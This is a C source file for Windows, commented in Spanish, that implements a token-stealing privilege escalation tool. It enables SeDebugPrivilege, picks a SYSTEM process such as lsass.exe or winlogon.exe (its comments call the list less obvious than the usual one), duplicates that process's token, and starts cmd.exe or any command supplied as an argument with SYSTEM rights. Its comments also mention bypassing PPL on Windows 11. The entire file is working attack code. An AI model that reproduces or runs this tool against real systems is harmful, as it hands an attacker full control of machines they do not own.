#include <Windows.h>
#include <namedpipeapi.h>
#include <tlhelp32.h>
#include <winternl.h>
#include <stdio.h>

#pragma comment(lib, "ntdll.lib")

#define SystemHandleInformation 0x10
#define SystemHandleInformationSize 1024 * 1024 * 2

// Declaración de NtQuerySystemInformation
typedef NTSTATUS(NTAPI* _NtQuerySystemInformation)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO
{
    USHORT UniqueProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR ObjectTypeIndex;
    UCHAR HandleAttributes;
    USHORT HandleValue;
    PVOID Object;
    ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, *PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION
{
    ULONG NumberOfHandles;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;

// Función para verificar si ya somos SYSTEM
// **Solo Funciona en Win10 / tienes que parchar PPL para lograrlo en win11 por la Proteccion
BOOL IsRunningAsSystem() {
    HANDLE hToken = NULL;
    BOOL bResult = FALSE;
    
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        return FALSE;
    }
    
    DWORD dwSize = 0;
    GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize);
    
    PTOKEN_USER pTokenUser = (PTOKEN_USER)HeapAlloc(GetProcessHeap(), 0, dwSize);
    if (pTokenUser) {
        if (GetTokenInformation(hToken, TokenUser, pTokenUser, dwSize, &dwSize)) {
            LPSTR sidString;
            if (ConvertSidToStringSidA(pTokenUser->User.Sid, &sidString)) {
                // SYSTEM SID: S-1-5-18
                if (strstr(sidString, "S-1-5-18") != NULL) {
                    bResult = TRUE;
                }
                LocalFree(sidString);
            }
        }
        HeapFree(GetProcessHeap(), 0, pTokenUser);
    }
    
    CloseHandle(hToken);
    return bResult;
}


// GetHandleAddress con limpieza de memoria
PVOID GetHandleAddress(int ProcessId, USHORT hObject) {
    ULONG returnLength = 0;
    PVOID result = NULL;
    
    PSYSTEM_HANDLE_INFORMATION handleTableInformation = 
        (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(
            GetProcessHeap(), 
            HEAP_ZERO_MEMORY, 
            SystemHandleInformationSize
        );
    
    if (!handleTableInformation) {
        printf("[-] Failed to allocate memory for handle table\n");
        return NULL;
    }
    
    // get puntero a NtQuerySystemInformation
    _NtQuerySystemInformation NtQuerySystemInformation = 
        (_NtQuerySystemInformation)GetProcAddress(
            GetModuleHandleA("ntdll.dll"), 
            "NtQuerySystemInformation"
        );
    
    if (!NtQuerySystemInformation) {
        printf("[-] Failed to get NtQuerySystemInformation\n");
        HeapFree(GetProcessHeap(), 0, handleTableInformation);
        return NULL;
    }
    
    NTSTATUS status = NtQuerySystemInformation(
        SystemHandleInformation, 
        handleTableInformation, 
        SystemHandleInformationSize, 
        &returnLength
    );
    
    if (status != 0) {
        printf("[-] NtQuerySystemInformation failed with status: 0x%X\n", status);
        HeapFree(GetProcessHeap(), 0, handleTableInformation);
        return NULL;
    }
    
    for (ULONG i = 0; i < handleTableInformation->NumberOfHandles; i++) {
        SYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = handleTableInformation->Handles[i];
        
        if (handleInfo.UniqueProcessId == ProcessId && 
            handleInfo.HandleValue == hObject) {
            printf("[+] Access Token handle 0x%x at 0x%p\n", 
                   handleInfo.HandleValue, 
                   handleInfo.Object);
            result = handleInfo.Object;
            break;
        }
    }
    
    // Limpiar memoria
    HeapFree(GetProcessHeap(), 0, handleTableInformation);
    return result;
}


// SetPrivilege con  manejo de errores

BOOL SetPrivilege(LPCTSTR lpszPrivilege) {
    TOKEN_PRIVILEGES tp = {0};
    HANDLE hCurrentProcessToken = NULL; 
    LUID luid;
    BOOL bResult = FALSE;

    if (!OpenProcessToken(
            GetCurrentProcess(), 
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, 
            &hCurrentProcessToken)) {
        printf("[-] OpenProcessToken error: %u\n", GetLastError()); 
        return FALSE; 
    }

    if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid)) {
        printf("[-] LookupPrivilegeValue error: %u\n", GetLastError()); 
        CloseHandle(hCurrentProcessToken);
        return FALSE; 
    }
    
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(
            hCurrentProcessToken, 
            FALSE, 
            &tp, 
            sizeof(TOKEN_PRIVILEGES), 
            NULL, 
            NULL)) { 
        printf("[-] AdjustTokenPrivileges error: %u\n", GetLastError()); 
        CloseHandle(hCurrentProcessToken);
        return FALSE; 
    } 
    
    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        printf("[-] The token does not have the specified privilege\n");
        CloseHandle(hCurrentProcessToken);
        return FALSE;
    }
    
    bResult = TRUE;
    CloseHandle(hCurrentProcessToken);
    return bResult;
}


// FindProcess con múltiples targets

int FindTargetProcess(const char** procnames, int count) {
    HANDLE hProcSnap;
    PROCESSENTRY32 pe32;
    int pid = 0;
    
    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hProcSnap) {
        printf("[-] Failed to create snapshot\n");
        return 0;
    }
    
    pe32.dwSize = sizeof(PROCESSENTRY32); 
    
    if (!Process32First(hProcSnap, &pe32)) {
        CloseHandle(hProcSnap);
        return 0;
    }
    
    // Buscar en la lista de procesos objetivo
    while (Process32Next(hProcSnap, &pe32)) {
        for (int i = 0; i < count; i++) {
            if (lstrcmpiA(procnames[i], pe32.szExeFile) == 0) {
                pid = pe32.th32ProcessID;
                printf("[+] Found target process: %s (PID: %d)\n", 
                       procnames[i], pid);
                goto cleanup;
            }
        }
    }
    
cleanup:
    CloseHandle(hProcSnap);
    return pid;
}


int main(int argc, char* argv[]) {
    HANDLE hProcess = NULL;
    HANDLE hToken = NULL;
    HANDLE hTokenDuplicate = NULL;
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    LPCWSTR command = L"C:\\Windows\\system32\\cmd.exe";
    int exitCode = 1;
    
    printf("\n");
    printf("======================================\n");
    printf("  Token Stealing - Privilege Escalation\n");
    printf("======================================\n\n");
    
    // ¡Verificar si ya somos SYSTEM
    if (IsRunningAsSystem()) {
        printf("[!] Already running as SYSTEM!\n");
        printf("[*] Spawning cmd.exe...\n");
        system("cmd.exe");
        return 0;
    }
    
    // Habilitar SeDebugPrivilege - si se encuentra deshabilitado se habilita / necesitas una shell con permisos de administrador
    if (!SetPrivilege(SE_DEBUG_NAME)) {
        printf("[-] Failed to enable SeDebugPrivilege\n");
        printf("[!] Run as Administrator!\n");
        goto cleanup;
    }
    printf("[+] SeDebugPrivilege enabled!\n");
    
    // Lista de procesos objetivo (menos obvio que solo winlogon como es costumbre)
    const char* targetProcesses[] = {
        "lsass.exe",      // Preferido: corre como SYSTEM
        "winlogon.exe",   // Backup
        "services.exe",   // Backup
        "csrss.exe"       // Último recurso
  //estos son en win10, recuerda usar bypass de PPL en win11
    };
    
    int target_pid = FindTargetProcess(targetProcesses, 4);
    if (target_pid == 0) {
        printf("[-] No suitable SYSTEM process found\n");
        goto cleanup;
    }
    
    // Abrir proceso objetivo
    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, target_pid);
    if (!hProcess) {
        printf("[-] Failed to OpenProcess: %d\n", GetLastError());
        goto cleanup;
    }
    printf("[+] OpenProcess successful!\n");
    
    // Abrir token del proceso
    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE, &hToken)) {
        printf("[-] Failed to OpenProcessToken: %d\n", GetLastError());
        goto cleanup;
    }
    printf("[+] OpenProcessToken successful!\n");
    
    // ¡ Debugging opcional¡
    #ifdef DEBUG
    GetHandleAddress(GetCurrentProcessId(), (USHORT)hToken);
    #endif
    
    // Duplicar
    if (!DuplicateTokenEx(
            hToken, 
            TOKEN_ALL_ACCESS, 
            NULL, 
            SecurityImpersonation, 
            TokenPrimary, 
            &hTokenDuplicate)) {
        printf("[-] Failed to DuplicateTokenEx: %d\n", GetLastError());
        goto cleanup;
    }
    printf("[+] DuplicateTokenEx successful!\n");
    
    #ifdef DEBUG
    GetHandleAddress(GetCurrentProcessId(), (USHORT)hTokenDuplicate);
    #endif
    
    // Permitir comando personalizados
    if (argc > 1) {
        // Convertir argumento a wide string
        int wchars_num = MultiByteToWideChar(CP_UTF8, 0, argv[1], -1, NULL, 0);
        wchar_t* wstr = (wchar_t*)malloc(wchars_num * sizeof(wchar_t));
        MultiByteToWideChar(CP_UTF8, 0, argv[1], -1, wstr, wchars_num);
        command = wstr;
    }
    
    // Crear proceso con token robado
    ZeroMemory(&si, sizeof(STARTUPINFOW));
    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
    si.cb = sizeof(STARTUPINFOW);
    
    if (!CreateProcessWithTokenW(
            hTokenDuplicate, 
            LOGON_WITH_PROFILE, 
            command, 
            NULL, 
            CREATE_NEW_CONSOLE, 
            NULL, 
            NULL, 
            &si, 
            &pi)) {
        printf("[-] Failed to CreateProcessWithTokenW: %d\n", GetLastError());
        goto cleanup;
    }
    
    printf("[+] Process spawned successfully!\n");
    printf("[+] New process PID: %d\n", pi.dwProcessId);
    printf("[+] You now have SYSTEM privileges!\n");
    
    exitCode = 0;
    
cleanup:
    //  cleaned - todos los handles
    if (hTokenDuplicate) CloseHandle(hTokenDuplicate);
    if (hToken) CloseHandle(hToken);
    if (hProcess) CloseHandle(hProcess);
    if (pi.hProcess) CloseHandle(pi.hProcess);
    if (pi.hThread) CloseHandle(pi.hThread);
    
    printf("\n[*] Cleanup complete\n");
    return exitCode;
}
